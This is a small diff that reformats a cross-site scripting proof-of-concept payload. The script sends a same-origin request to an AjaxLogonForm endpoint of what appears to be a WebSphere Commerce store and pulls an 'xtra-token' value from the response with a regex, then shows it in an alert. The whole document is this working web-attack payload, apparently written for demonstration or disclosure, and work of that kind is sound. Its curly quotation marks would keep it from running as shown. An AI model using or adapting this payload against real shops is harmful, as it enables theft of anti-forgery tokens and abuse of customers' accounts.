@@ -1,4 +1,6 @@
-<script> var xhr=new XMLHttpRequest(); xhr.onreadystatechange=function() 
+<script> 
+var xhr=new XMLHttpRequest(); 
+xhr.onreadystatechange=function() 
 {if(xhr.readyState==XMLHttpRequest.DONE) {alert(xhr.responseText.match(/xtra-token=“(.*)“/i)[0]);}}; 
 xhr.open(‘GET’,‘/webapp/wcs/stores/servlet/nl/AjaxLogonForm?storeId=12501&myAcctMain=1’,true); xhr.send(null);
 </script>
